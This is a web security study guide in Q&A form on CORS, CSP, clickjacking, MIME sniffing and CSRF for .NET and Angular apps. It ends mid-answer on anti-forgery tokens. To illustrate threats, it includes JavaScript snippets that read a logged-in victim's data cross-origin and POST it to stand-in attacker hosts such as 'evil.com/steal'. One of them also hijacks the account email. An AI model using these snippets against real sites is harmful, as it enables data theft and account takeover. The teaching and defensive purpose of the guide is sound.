## SECTION A — CORS & CSP & SECURITY HEADERS

### EASY

**A1.** What is CORS? Why does it exist? What happens if you don't configure CORS on your API?

<details><summary>Answer</summary>

CORS (Cross-Origin Resource Sharing) is a browser security mechanism that blocks JavaScript from making requests to a different origin (different domain, port, or protocol) than the page that loaded it. It exists to enforce the **Same-Origin Policy** — preventing a malicious site from silently calling your bank's API using the victim's cookies. Without CORS configured on your API, every cross-origin AJAX call from your Angular app will be blocked by the browser before it even reaches your server. The .NET API never sees the request.
</details>

<details><summary>Deep Dive</summary>

**The Same-Origin Policy — why browsers restrict this**

The browser's Same-Origin Policy (SOP) says: JavaScript running on `https://shop.com` may not read responses from `https://api.shop.com` — because the port or subdomain differs. This is intentional. Without SOP, any page you visit could silently call `https://yourbank.com/api/transfer` using your session cookies and drain your account.

CORS is the **controlled relaxation** of SOP. The server opts in to saying "I trust requests from this origin."

**How the browser enforces it**

1. Your Angular app on `https://shop.com` makes a fetch to `https://api.shop.com/products`.
2. The browser adds an `Origin: https://shop.com` header automatically.
3. The server responds with (or without) `Access-Control-Allow-Origin: https://shop.com`.
4. The browser checks: does the response header allow this origin? If not, it blocks the JS from reading the response — even though the server already processed the request and responded.

This is critical: **CORS is enforced by the browser, not the server.** The server still receives and processes the request. CORS only prevents the browser from handing the response back to JavaScript. Tools like Postman or curl bypass CORS entirely — they're not browsers.

**What "not configuring" CORS looks like in .NET**

```csharp
// No UseCors() call → browser blocks all cross-origin reads
// Angular app gets: "No 'Access-Control-Allow-Origin' header is present"
```

The Angular app shows a network error, the .NET logs show nothing (for simple GET requests), and developers often wrongly blame the Angular code.

**Origin = scheme + host + port**

| URL | Same origin as `https://api.shop.com:443`? |
|-----|--------------------------------------------|
| `https://api.shop.com/users` | Yes |
| `http://api.shop.com` | No — different scheme |
| `https://shop.com` | No — different host |
| `https://api.shop.com:8080` | No — different port |
</details>

---

**A2.** What's the difference between CORS and CSP?

<details><summary>Answer</summary>

- **CORS** — controls which *external origins* can call your API. Server-side configuration that tells browsers "I accept requests from these origins." Protects your **API** from being called by unauthorized sites.
- **CSP** (Content Security Policy) — controls what resources your **own web page** is allowed to load: scripts, styles, images, fonts, frames. Protects your **frontend** from injected malicious content (XSS).

Both are enforced by the browser, but they solve completely different problems.
</details>

<details><summary>Deep Dive</summary>

**Different threat models**

| | CORS | CSP |
|---|---|---|
| Protects | Your API | Your web page |
| Threat | Unauthorized sites calling your API | Injected scripts/styles on your page |
| Configured on | The API server | The web server serving your HTML |
| Header location | API response | HTML page response |
| Main attack prevented | Cross-site request forgery (data theft) | Cross-site scripting (XSS) |

**CORS scenario**

Attacker owns `evil.com`. They trick a user into visiting it. Their page runs:
```js
fetch('https://yourapi.com/user/profile', { credentials: 'include' })
```
Without CORS, the browser blocks the JS from reading the response. The attack fails.

**CSP scenario**

Your site has an XSS vulnerability. Attacker injects:
```html
<script src="https://evil.com/stealer.js"></script>
```
With CSP `script-src 'self'`, the browser refuses to load any script from `evil.com`. The attack fails.

**They work together — different layers**

A production app needs both:
- CORS on the API: "only my Angular app's origin can call me"
- CSP on the Angular app: "only my own scripts and trusted CDNs can run"

Removing either leaves a different attack surface open. They don't overlap or replace each other.

**Angular specifics**

Angular apps are served from one server (or a CDN). CSP headers go on that server's responses. The Angular app makes API calls to your .NET backend — those are cross-origin, so the .NET backend needs CORS. Two completely separate configurations.
</details>

---

**A3.** What does `X-Frame-Options: DENY` protect against?

<details><summary>Answer</summary>

It protects against **clickjacking** — an attack where your page is embedded inside an invisible `<iframe>` on a malicious site. The attacker overlays their UI on top of your page, tricking users into clicking your buttons (e.g., "Confirm Transfer") while thinking they're clicking something else. `DENY` tells the browser: never render this page inside any frame, anywhere.
</details>

<details><summary>Deep Dive</summary>

**How a clickjacking attack works**

1. Attacker creates `evil.com` with a button: "Click here to win $1000"
2. Behind that button (using CSS `opacity: 0; position: absolute`), they embed your banking page in an `<iframe>` — lined up so your "Transfer Money" button is directly under their fake button
3. Victim clicks the fake button, actually clicks your Transfer button
4. Because the victim is logged in to your bank, the transfer executes

**The three values**

```http
X-Frame-Options: DENY          # No framing allowed, ever
X-Frame-Options: SAMEORIGIN    # Only pages from the same origin may frame this
X-Frame-Options: ALLOW-FROM https://trusted.com  # Deprecated, not widely supported
```

**Modern replacement: CSP `frame-ancestors`**

`X-Frame-Options` is old (HTTP/1.1 era). The modern equivalent is:

```http
Content-Security-Policy: frame-ancestors 'none'        # equivalent to DENY
Content-Security-Policy: frame-ancestors 'self'        # equivalent to SAMEORIGIN
Content-Security-Policy: frame-ancestors https://trusted.com  # specific origin
```

CSP `frame-ancestors` is more powerful — it supports multiple origins, wildcards, and is the standard going forward. Most security audits expect both headers for maximum browser compatibility.

**In .NET middleware**

```csharp
app.Use(async (ctx, next) =>
{
    ctx.Response.Headers.Append("X-Frame-Options", "DENY");
    ctx.Response.Headers.Append("Content-Security-Policy", "frame-ancestors 'none'");
    await next();
});
```

Or via `NWebsec` / `SecurityHeaders` NuGet packages which handle the full set.
</details>

---

**A4.** What does `X-Content-Type-Options: nosniff` do?

<details><summary>Answer</summary>

It prevents **MIME type sniffing**. Without it, browsers try to "guess" the content type of a response by inspecting its bytes, even if the server declared a different `Content-Type`. An attacker could upload an HTML file disguised as an image (`Content-Type: image/png`), and without `nosniff`, some browsers would execute it as HTML/script. With `nosniff`, the browser strictly trusts the declared `Content-Type` and refuses to execute mismatched content.
</details>

<details><summary>Deep Dive</summary>

**What MIME sniffing is**

Early browsers were "helpful" — if a server sent a `.txt` file but the bytes looked like HTML, the browser would render it as HTML. This was designed for broken servers. Attackers weaponized it.

**The attack**

1. Attacker uploads `profile-photo.png` to your site
2. The file's bytes actually start with `<script>alert('XSS')</script>`
3. Server correctly sends `Content-Type: image/png`
4. Browser with sniffing enabled: "these bytes look like JavaScript, I'll run them"
5. XSS executes in your origin's context — game over

**The fix**

```http
X-Content-Type-Options: nosniff
```

This single directive tells the browser: "Trust my Content-Type. Do not sniff. If I say it's an image, treat it as an image — even if it looks like a script."

**Practical impact in .NET**

```csharp
// Static files serving user uploads without nosniff = XSS risk
app.UseStaticFiles(); // Fine for known assets

// Add the header globally
app.Use(async (ctx, next) => {
    ctx.Response.Headers.Append("X-Content-Type-Options", "nosniff");
    await next();
});
```

Also relevant for script loading: if you serve a `.js` file with the wrong Content-Type, `nosniff` prevents the browser from executing it at all — a useful defence-in-depth measure against misconfigured CDN responses.
</details>

---

### MEDIUM

**A5.** Your Angular app works on `localhost:4200` but after deploying to Azure, API calls fail silently. No errors in the .NET logs. What's wrong?

<details><summary>Answer</summary>

The deployed origin (`https://myapp.azurestaticapps.net` or similar) isn't in your .NET CORS allowed origins list. Your localhost origin was allowed during development. The browser sends the preflight/request, the server responds without the correct `Access-Control-Allow-Origin` header, and the browser blocks the JS from reading the response. Because the browser blocks it client-side before processing the actual response body, your .NET logs may show nothing (for simple requests) or a 200 response that Angular never sees.
</details>

<details><summary>Deep Dive</summary>

**Why there are no .NET logs**

For simple GET requests: .NET processes the request and responds, but doesn't log a CORS error — CORS enforcement is entirely browser-side. The server has no idea the browser rejected its response.

For preflight OPTIONS requests: if CORS isn't configured to handle OPTIONS, .NET may return 404 or 405 with no useful log. The browser then aborts the actual request without ever sending it.

**The hidden config problem**

```csharp
// Development only — common mistake
builder.Services.AddCors(o => o.AddPolicy("default", p =>
    p.WithOrigins("http://localhost:4200")
     .AllowAnyHeader()
     .AllowAnyMethod()));
```

Deployed Angular app's origin: `https://myapp.azurestaticapps.net` — not in the list.

**The fix — environment-aware origins**

```csharp
// Read from config, set per environment in Azure App Service settings
var allowedOrigins = builder.Configuration
    .GetSection("Cors:AllowedOrigins")
    .Get<string[]>() ?? Array.Empty<string>();

builder.Services.AddCors(o => o.AddPolicy("default", p =>
    p.WithOrigins(allowedOrigins)
     .AllowAnyHeader()
     .AllowAnyMethod()
     .AllowCredentials()));
```

`appsettings.Development.json`:
```json
{ "Cors": { "AllowedOrigins": ["http://localhost:4200"] } }
```

Azure App Service Environment Variable:
```
Cors__AllowedOrigins__0 = https://myapp.azurestaticapps.net
```

**Debugging checklist**

1. Open DevTools → Network → find the failed request
2. Look for `Access-Control-Allow-Origin` in the response headers — missing = CORS misconfiguration
3. Check for a prior OPTIONS preflight request — if it's 404/405, middleware order is wrong
4. Verify `app.UseCors()` is called **before** `app.UseAuthorization()` and `app.MapControllers()`
</details>

---

**A6.** What is a preflight request? When does the browser send one? What headers does it include? What must the server respond with for the preflight to succeed?

<details><summary>Answer</summary>

A preflight is an automatic `OPTIONS` request the browser sends before a "non-simple" cross-origin request. It asks the server: "Will you accept this kind of request?" The server must respond with the right `Access-Control-Allow-*` headers. Only if the preflight succeeds does the browser send the real request.

- **Triggers** — any request with a custom header (`Authorization`, `Content-Type: application/json`), or a method other than GET/POST/HEAD.
- **Preflight request headers** — `Origin`, `Access-Control-Request-Method`, `Access-Control-Request-Headers`
- **Required server response** — `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers` (and optionally `Access-Control-Max-Age`)
</details>

<details><summary>Deep Dive</summary>

**Simple vs non-simple requests**

The browser distinguishes between "simple" requests (which don't need a preflight) and "non-simple" requests (which do).

**Simple requests** (no preflight):
- Method: GET, POST, or HEAD
- Headers: only `Accept`, `Accept-Language`, `Content-Language`, `Content-Type: application/x-www-form-urlencoded | multipart/form-data | text/plain`

**Non-simple requests** (preflight required):
- Any other method (PUT, DELETE, PATCH)
- Custom headers (e.g. `Authorization`, `X-Custom-Header`)
- `Content-Type: application/json` ← this triggers a preflight

**What the full preflight exchange looks like**

```
Browser → Server (OPTIONS):
OPTIONS /api/products HTTP/1.1
Origin: http://localhost:4200
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization

Server → Browser (200 OK):
Access-Control-Allow-Origin: http://localhost:4200
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: content-type, authorization
Access-Control-Max-Age: 86400       ← cache this preflight for 24h
```

If the server doesn't respond with these headers (or returns 404 for OPTIONS), the browser cancels the actual request entirely.

**`Access-Control-Max-Age` — preflight caching**

Browsers cache successful preflight responses. Set this to avoid a round-trip OPTIONS call on every request:
```csharp
p.WithOrigins("https://shop.com")
 .AllowAnyHeader()
 .AllowAnyMethod()
 .SetPreflightMaxAge(TimeSpan.FromDays(1));
```

**In .NET — middleware order matters**

```csharp
app.UseRouting();
app.UseCors("default");   // MUST be before UseAuthorization
app.UseAuthorization();
app.MapControllers();
```

If `UseCors` is after `UseAuthorization`, OPTIONS requests hit auth middleware first, get rejected as 401/403, and the preflight fails before CORS even runs.
</details>

---

**A7.** You add `Content-Security-Policy: default-src 'self'` to your API. Your Angular app's Material components break. The console shows CSP violation errors for inline styles. Explain why and give two solutions with different security trade-offs.

<details><summary>Answer</summary>

Angular Material injects `<style>` tags directly into the DOM at runtime via JavaScript. CSP `default-src 'self'` covers `style-src`, which by default blocks all inline styles. The browser sees these dynamically injected `<style>` tags and blocks them.

**Solution 1 — `'unsafe-inline'`** (weaker): `style-src 'self' 'unsafe-inline'` — allows all inline styles everywhere. Easy to implement but defeats much of the XSS protection CSP provides for styles.

**Solution 2 — Nonce** (stronger): Server generates a random nonce per request, adds it to the CSP header and to every `<style>` tag. Only `<style>` tags with the matching nonce are allowed. Harder to implement with Angular but provides real protection.
</details>

<details><summary>Deep Dive</summary>

**Why Material uses inline styles**

Angular Material's theming system injects component styles as `<style>` elements into the `<head>` at runtime. This is how Angular's `ViewEncapsulation.Emulated` and Material's overlay mechanism work — styles are scoped or injected dynamically rather than bundled in a static stylesheet.

**What `default-src 'self'` actually blocks**

`default-src` is the fallback for all resource types. Without a specific `style-src`, `default-src 'self'` means: "for styles, only allow stylesheets loaded from my own origin — no inline styles." The browser logs:

```
Refused to apply inline style because it violates the following Content Security Policy directive: 
"style-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), 
or a nonce ('nonce-...') is required to enable inline execution.
```

**Solution 1: `'unsafe-inline'`**

```http
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'
```

- Pro: Zero code changes, fixes Material immediately
- Con: Any XSS that injects a `<style>` tag succeeds. An attacker who injects `<style>` can overlay your UI, fake login forms, or steal data via CSS attribute selectors. "Unsafe" is in the name for a reason.

**Solution 2: Nonce-based**

Server (ASP.NET Core middleware):
```csharp
app.Use(async (ctx, next) => {
    var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));
    ctx.Items["csp-nonce"] = nonce;
    ctx.Response.Headers.Append("Content-Security-Policy",
        $"default-src 'self'; style-src 'self' 'nonce-{nonce}'");
    await next();
});
```

Angular SSR renders HTML with the nonce on each `<style>` tag:
```html
<style nonce="abc123">/* Material styles */</style>
```

CSP checks: does this `<style>` tag's nonce match the one in the header? Yes → allowed. Any injected `<style>` without the nonce → blocked.

- Pro: Strong protection — only server-blessed style tags work
- Con: Requires Angular SSR or a server-rendered index.html. Doesn't work with pure client-side rendering where the server doesn't control what Angular injects at runtime.

**Solution 3: Hash-based (middle ground)**

For static known inline styles, you can hash them:
```http
Content-Security-Policy: style-src 'self' 'sha256-abc123...'
```

But Material injects different styles per component tree, so hashing all of them is impractical without tooling.

**Practical recommendation**

For SPAs with Material and no SSR: use `'unsafe-inline'` with `style-src` only (not `script-src`), keep `script-src 'self'` strict. This keeps your most dangerous attack vector (script injection) locked down while accepting the style trade-off.
</details>

---

**A8.** Why does `AllowCredentials()` in CORS matter for cookie auth? What happens if you remove it?

<details><summary>Answer</summary>

By default, browsers strip cookies and `Authorization` headers from cross-origin requests. `AllowCredentials()` on the server, combined with `withCredentials: true` on the client, tells the browser: "include cookies and auth headers in this cross-origin request." Without it, your cookie-based auth never works across origins — the browser sends the request without the session cookie, the server sees an unauthenticated request, and returns 401.
</details>

<details><summary>Deep Dive</summary>

**The default: credentials stripped**

When Angular makes a cross-origin fetch, the browser applies a conservative default: no cookies, no `Authorization` headers, no TLS client certificates. This protects users from their credentials being silently sent to a server they don't trust.

**The opt-in: both sides must agree**

This is a two-part handshake:

**Client side (Angular):**
```typescript
// HttpClient — set globally in a module or interceptor
const httpOptions = {
  withCredentials: true   // "send my cookies cross-origin"
};
this.http.get('/api/profile', httpOptions);
```

**Server side (.NET):**
```csharp
p.WithOrigins("https://shop.com")
 .AllowCredentials()  // "I accept credentials from allowed origins"
```

**What happens without it**

| Scenario | Result |
|---|---|
| `AllowCredentials()` on server, `withCredentials: false` client | Cookies not sent, user appears unauthenticated |
| `AllowCredentials()` missing on server, `withCredentials: true` client | Browser blocks request: "response to preflight doesn't allow credentials" |
| Both missing | Request works, but no cookies — fine for public APIs, broken for auth |

**The `AllowAnyOrigin()` + `AllowCredentials()` trap**

.NET throws an `InvalidOperationException` if you combine these:
```
The CORS protocol does not allow specifying a wildcard (any) origin 
and credentials at the same time.
```

This is by design — allowing any origin with credentials is an extremely dangerous open CORS policy. The spec itself forbids it.

**SameSite cookies and CORS interaction**

Even with `AllowCredentials()`, `SameSite=Strict` cookies won't be sent cross-origin. You need `SameSite=None; Secure` for cookies that must travel cross-origin:

```csharp
options.Cookie.SameSite = SameSiteMode.None;
options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
```

This combination (HTTPS + SameSite=None + AllowCredentials) is the standard setup for SPA cookie auth.
</details>

---

**A9.** Compare these two CORS configurations. Which is insecure and why?

```csharp
// Config A
builder.Services.AddCors(o => o.AddPolicy("default", p =>
    p.WithOrigins("https://myapp.com")
     .AllowAnyHeader()
     .AllowCredentials()));

// Config B
builder.Services.AddCors(o => o.AddPolicy("default", p =>
    p.AllowAnyOrigin()
     .AllowAnyHeader()
     .AllowCredentials()));
```

<details><summary>Answer</summary>

- **Config B is both insecure AND invalid at runtime.** .NET throws an `InvalidOperationException` when you combine `AllowAnyOrigin()` with `AllowCredentials()` — the CORS spec explicitly forbids it. Conceptually it's also dangerous: it would allow any website on the internet to make credentialed requests using the user's cookies, enabling attacker-controlled sites to call your API as the authenticated user.
- **Config A is correct** — credentials are only accepted from a specific, trusted origin.
</details>

<details><summary>Deep Dive</summary>

**Why the spec forbids wildcard + credentials**

The `Access-Control-Allow-Origin: *` wildcard header tells the browser "any origin can read this response." But `Access-Control-Allow-Credentials: true` tells the browser "include the user's cookies." Combining these would mean: any site can silently make authenticated calls to your API as any logged-in user. This is the exact attack CORS was designed to prevent.

The spec authors explicitly banned this combination. .NET enforces the spec:

```
System.InvalidOperationException: The CORS protocol does not allow specifying 
a wildcard (any) origin and credentials at the same time. Configure either 
a wildcard origin OR allow credentials, not both.
```

**What a real attack would look like with a permissive server**

If somehow a server responded with both headers (a misconfigured proxy might):

1. Alice is logged into `https://yourshop.com` — her session cookie exists
2. Alice visits `https://evil.com` (phishing link)
3. `evil.com` runs:
```js
fetch('https://api.yourshop.com/orders', { credentials: 'include' })
  .then(r => r.json())
  .then(data => fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(data) }));
```
4. Browser sends Alice's cookies. API returns her order history. Attacker receives it.

**Config A — what "correct" actually requires**

Config A is missing `AllowAnyMethod()` — `AllowAnyHeader()` allows custom headers but methods default to only GET and HEAD. In practice you likely need:

```csharp
p.WithOrigins("https://myapp.com")
 .AllowAnyHeader()
 .AllowAnyMethod()           // allow DELETE, PUT, PATCH
 .AllowCredentials()
```

**Origin list for multiple environments**

```csharp
p.WithOrigins(
    "https://myapp.com",
    "https://staging.myapp.com",
    "http://localhost:4200"    // dev only — ideally gated by env check
)
```
</details>

---

**A10.** Write the `Permissions-Policy` header value that disables accelerometer, camera, and microphone. What does each API do and why disable them?

<details><summary>Answer</summary>

```http
Permissions-Policy: accelerometer=(), camera=(), microphone=()
```

An empty `()` means "denied for all origins including the page itself."

- **Accelerometer**: reads device motion/orientation. Could fingerprint users or detect keystrokes via vibration analysis.
- **Camera**: access to device camera. Dangerous if XSS runs — silently captures video.
- **Microphone**: access to device microphone. Same risk as camera — silent audio capture via injected script.

Disabling APIs your app doesn't use is defence-in-depth: even if XSS occurs, the attacker can't use these hardware APIs.
</details>

<details><summary>Deep Dive</summary>

**What Permissions-Policy replaced**

This header replaced `Feature-Policy` (deprecated). Same purpose, cleaner syntax.

**The full syntax**

```http
Permissions-Policy: <feature>=(<allowlist>)
```

Allowlist values:
- `()` — denied everywhere (page + iframes)
- `(self)` — only the page itself, not embedded iframes
- `("https://trusted.com")` — only that specific origin
- `*` — allow everywhere (default for most features)

**A realistic e-commerce policy**

```http
Permissions-Policy: 
  accelerometer=(),
  camera=(),
  microphone=(),
  geolocation=(),
  payment=(self),
  usb=(),
  bluetooth=()
```

`payment=(self)` allows your own page to use the Payment Request API (for Apple Pay / Google Pay). Everything else locked down.

**Why hardware APIs are high-risk under XSS**

If an attacker achieves XSS, they can run arbitrary JS in your page's origin. Without Permissions-Policy, that script could:

```js
navigator.mediaDevices.getUserMedia({ video: true, audio: true })
  .then(stream => { /* stream video to attacker's server */ });
```

The user would see a browser permission popup — unless they previously granted permission to your site. `Permissions-Policy` removes the option entirely, regardless of user grants.

**In .NET middleware**

```csharp
ctx.Response.Headers.Append("Permissions-Policy",
    "accelerometer=(), camera=(), microphone=(), geolocation=(), usb=()");
```
</details>

---

### HARD

**A11.** Design a CSP policy for an e-commerce app that uses: Angular (self-hosted), Angular Material (inline styles), Stripe Elements (loads from `js.stripe.com`), Google Fonts, and your own API. Write the full CSP header value. Explain each directive.

<details><summary>Answer</summary>

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://js.stripe.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https:;
  frame-src https://js.stripe.com;
  connect-src 'self' https://api.stripe.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
```
</details>

<details><summary>Deep Dive</summary>

**Directive-by-directive explanation**

**`default-src 'self'`**
Fallback for any directive not explicitly listed. Only load resources from the same origin. This catches anything you forgot to specify explicitly.

**`script-src 'self' https://js.stripe.com`**
Scripts may only come from your own origin or Stripe's CDN. Stripe Elements is a JS library loaded from `js.stripe.com` — it must be explicitly allowed. No inline scripts allowed (no `'unsafe-inline'`) — this is the most important restriction for XSS prevention. Angular compiles to static `.js` files, so `'self'` covers it.

**`style-src 'self' 'unsafe-inline' https://fonts.googleapis.com`**
`'unsafe-inline'` is required for Angular Material's runtime-injected `<style>` tags. `fonts.googleapis.com` serves the Google Fonts CSS file (which is a stylesheet, not a font file). The font files themselves come from `fonts.gstatic.com`, covered by `font-src`.

**`font-src 'self' https://fonts.gstatic.com`**
Google Fonts CSS references font files from `gstatic.com` — a separate origin. Without this, fonts load but the actual `.woff2` files are blocked.

**`img-src 'self' data: https:`**
`data:` allows base64-encoded images (Angular Material icons use these). `https:` allows product images from any HTTPS source — useful if your product images come from a CDN or Azure Blob Storage. In a tighter policy, replace with `https://yourstorage.blob.core.windows.net`.

**`frame-src https://js.stripe.com`**
Stripe Elements renders the card input as an `<iframe>` hosted on Stripe's domain (for PCI compliance — card data never touches your origin). Without this, the Stripe card field simply doesn't appear.

**`connect-src 'self' https://api.stripe.com`**
Controls fetch/XHR/WebSocket destinations. Angular calls your own API (`'self'`) and Stripe's API (`api.stripe.com`) for payment intent creation. The `https://api.stripe.com` is needed for Stripe.js's internal API calls.

**`object-src 'none'`**
Blocks `<object>`, `<embed>`, and `<applet>` — legacy plugin content. These are almost never needed and are a classic XSS vector. Always set this.

**`base-uri 'self'`**
Prevents injection of a `<base>` tag that would redirect all relative URLs to an attacker's server. Easy attack to miss, one directive to block it.

**`form-action 'self'`**
Prevents injected `<form action="https://evil.com">` from stealing form submissions. Only your own origin can be a form target.

**What's missing for production hardening**

```http
upgrade-insecure-requests;           # force all HTTP to HTTPS
report-uri /csp-violation-report;    # log violations
```

**CSP violation reporting in .NET**

```csharp
app.MapPost("/csp-violation-report", async (HttpContext ctx) => {
    var body = await new StreamReader(ctx.Request.Body).ReadToEndAsync();
    logger.LogWarning("CSP violation: {Report}", body);
    return Results.Ok();
}).AllowAnonymous();
```

Add `report-to` with a JSON endpoint for modern browsers. Run in report-only mode first (`Content-Security-Policy-Report-Only`) to catch violations before enforcing.
</details>

---

**A12.** You're auditing a codebase and find:

```csharp
app.UseCors(x => x
    .SetIsOriginAllowed(_ => true)
    .AllowAnyMethod()
    .AllowAnyHeader()
    .AllowCredentials());
```

Explain exactly what `SetIsOriginAllowed(_ => true)` does, why it's dangerous, and write a realistic attack scenario. Then write the corrected version.

<details><summary>Answer</summary>

`SetIsOriginAllowed(_ => true)` is a lambda that receives any origin string and always returns `true` — meaning every origin on the internet is allowed. Unlike `AllowAnyOrigin()` (which sets `*` and is blocked from combining with `AllowCredentials()` by .NET), `SetIsOriginAllowed` bypasses that guard by setting the origin to the *exact value sent by the browser*, while still passing .NET's validation. Combined with `AllowCredentials()`, it means any website can make fully authenticated cross-origin requests to your API using the victim's cookies.
</details>

<details><summary>Deep Dive</summary>

**Why this bypasses .NET's safety check**

.NET blocks `AllowAnyOrigin().AllowCredentials()` at runtime. But `SetIsOriginAllowed(_ => true)` bypasses the guard — instead of setting `Access-Control-Allow-Origin: *`, the server echoes back whatever `Origin:` header the browser sent:

```http
Request:  Origin: https://evil.com
Response: Access-Control-Allow-Origin: https://evil.com
          Access-Control-Allow-Credentials: true
```

The browser sees a specific origin match plus credentials allowed → proceeds with the credentialed request. This is the worst of all worlds: wildcard behavior with credentials allowed.

**Realistic attack scenario**

1. Alice uses your e-commerce site. She's logged in — her session cookie is set for `api.yourshop.com`.
2. She receives a phishing email and clicks a link to `https://evil-deals.com`.
3. That page silently runs:

```js
// On evil-deals.com
async function exfiltrate() {
    // Step 1: Get her order history (sensitive PII)
    const orders = await fetch('https://api.yourshop.com/api/orders', {
        credentials: 'include'
    }).then(r => r.json());

    // Step 2: Get her saved address
    const profile = await fetch('https://api.yourshop.com/api/account/profile', {
        credentials: 'include'
    }).then(r => r.json());

    // Step 3: Change her email to attacker's
    await fetch('https://api.yourshop.com/api/account/email', {
        method: 'PUT',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: 'attacker@evil.com' })
    });

    // Step 4: Send everything to attacker's server
    await fetch('https://evil-deals.com/steal', {
        method: 'POST',
        body: JSON.stringify({ orders, profile })
    });
}
exfiltrate();
```

4. Because of the open CORS config, every request succeeds. Alice's data is exfiltrated. Her account is hijacked. She sees nothing — no popups, no prompts.

**The corrected version**

```csharp
// In appsettings.json per environment
// "Cors": { "AllowedOrigins": ["https://yourshop.com", "https://staging.yourshop.com"] }

var allowedOrigins = builder.Configuration
    .GetSection("Cors:AllowedOrigins")
    .Get<string[]>() ?? throw new InvalidOperationException("Cors:AllowedOrigins not configured");

builder.Services.AddCors(o => o.AddPolicy("default", p =>
    p.WithOrigins(allowedOrigins)
     .AllowAnyHeader()
     .AllowAnyMethod()
     .AllowCredentials()));
```

**For multi-tenant/dynamic origins** (legitimate use case for `SetIsOriginAllowed`)

If you genuinely need dynamic origin validation (e.g., tenant subdomains):

```csharp
.SetIsOriginAllowed(origin => {
    var uri = new Uri(origin);
    // Only allow subdomains of your own domain
    return uri.Host.EndsWith(".yourshop.com", StringComparison.OrdinalIgnoreCase)
        && uri.Scheme == "https";
})
```

Never use `_ => true`. Always validate the origin against a real rule.
</details>

---

**A13.** Angular Material uses `ViewEncapsulation.None` which injects global `<style>` tags. Why does this conflict with CSP? What would a production-grade solution look like? Explain the nonce-based approach.

<details><summary>Answer</summary>

`ViewEncapsulation.None` means Angular doesn't scope component styles — instead it dumps them as plain `<style>` tags into the document's `<head>` at runtime, injected by JavaScript. CSP's `style-src` directive (or `default-src` fallback) blocks inline styles unless `'unsafe-inline'`, a hash, or a nonce is present. Since Angular injects these styles dynamically via JS (not in the original HTML), static hashes don't work. A production-grade solution uses **Angular SSR with nonces**: the server generates a fresh nonce per request, embeds it in the CSP header, and Angular's server-side renderer attaches it to each `<style>` tag it outputs.
</details>

<details><summary>Deep Dive</summary>

**What Angular Material actually does at runtime**

Angular Material's overlay system and theming injects styles like this:

```html
<!-- Angular Material injects at runtime via JS -->
<head>
  <style>.mat-button { ... }</style>
  <style>.mat-dialog-container { ... }</style>
  <style>.cdk-overlay-container { ... }</style>
</head>
```

These are created with `document.createElement('style')` and `document.head.appendChild(...)`. They are inline styles added by JavaScript — the exact thing CSP `style-src` is designed to block.

**Why hashes don't work here**

A CSP hash (`'sha256-abc123'`) works for static, known inline styles in your HTML. But Angular Material generates style content dynamically based on theme configuration, component state, and tree-shaking. You can't pre-compute hashes for runtime-generated content.

**The nonce approach — how it works**

A nonce (number used once) is a cryptographically random value generated fresh per HTTP request.

**Step 1: Server generates nonce and sets CSP header**

```csharp
// ASP.NET Core middleware
app.Use(async (ctx, next) => {
    // 128-bit random nonce, base64 encoded
    var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(16));
    ctx.Items["csp-nonce"] = nonce;  // share with Angular SSR renderer

    ctx.Response.Headers.Append("Content-Security-Policy",
        $"default-src 'self'; " +
        $"script-src 'self'; " +
        $"style-src 'self' 'nonce-{nonce}';");  // only styles with THIS nonce
    await next();
});
```

**Step 2: Angular SSR stamps the nonce on every `<style>` tag**

Angular 16+ supports nonce via the `ngCspNonce` attribute on the `<app-root>` element or via `CSP_NONCE` injection token:

```typescript
// In your server.ts (Angular SSR)
import { CSP_NONCE } from '@angular/core';

// Provide the nonce from the request context
providers: [
  { provide: CSP_NONCE, useFactory: () => getNonceFromRequest() }
]
```

Angular then renders:
```html
<style nonce="abc123xyz">.mat-button { ... }</style>
```

**Step 3: Browser validates**

Browser receives:
```http
Content-Security-Policy: style-src 'self' 'nonce-abc123xyz'
```
```html
<style nonce="abc123xyz">/* allowed - nonce matches */</style>
<style>/* BLOCKED - no nonce */</style>
<style nonce="wrongnonce">/* BLOCKED - nonce doesn't match */</style>
```

An attacker who injects `<style>alert('xss')</style>` has no way to know the current request's nonce — it's different every time, generated server-side, never exposed.

**Why this requires SSR**

With a pure client-side Angular app (no SSR), the server serves a static `index.html` with no knowledge of what styles Angular will inject at runtime. The server can't embed the nonce into dynamically-injected styles it doesn't control.

With SSR, the server renders the full Angular component tree, collects all style tags, stamps the nonce, then sends the complete HTML. The browser receives a fully rendered page where every `<style>` tag already has the nonce.

**Practical trade-off**

| Approach | Security | Complexity |
|---|---|---|
| `'unsafe-inline'` | Low | Zero |
| Nonce + SSR | High | High (SSR required) |
| Hash-based | Medium | High (tooling needed) |

For most SPAs without SSR: accept `'unsafe-inline'` for `style-src` only, keep `script-src` strict. Inline style injection is a much weaker attack vector than inline script injection.
</details>

---

**A14.** You use `SameSite=Strict` for CSRF protection. A colleague argues you should add anti-forgery tokens (`[ValidateAntiForgeryToken]`) too. Are they right? When would one not be enough?

<details><summary>Answer</summary>

Your colleague is right. `SameSite=Strict` is strong but has gaps:
- it's a client-side browser feature — doesn't work if the cookie predates the SameSite attribute, the user's browser is old, or the attacker controls a subdomain

Anti-forgery tokens (synchronizer token pattern) are server-side and independent of cookie attributes — they provide defence-in-depth. Neither alone covers all attack scenarios.
</details>

<details><summary>Deep Dive</summary>

**How each mechanism works**

**SameSite=Strict**

```csharp
options.Cookie.SameSite = SameSiteMode.Strict;
```

When set, the browser simply refuses to include the cookie in requests originating from another site. A cross-site form POST or AJAX call never carries the session cookie — the server sees an unauthenticated request.

Enforcement is entirely in the browser. The server does nothing special — it just relies on the cookie not arriving.

**Anti-Forgery Tokens (Synchronizer Token Pattern)**

```csharp
// Server generates a random token, stores it in session
// Embeds it in HTML as a hidden field or custom header

// In ASP.NET Core:
[ValidateAntiForgeryToken]
[HttpPost]
public IActionResult Transfer(TransferModel model) { ... }
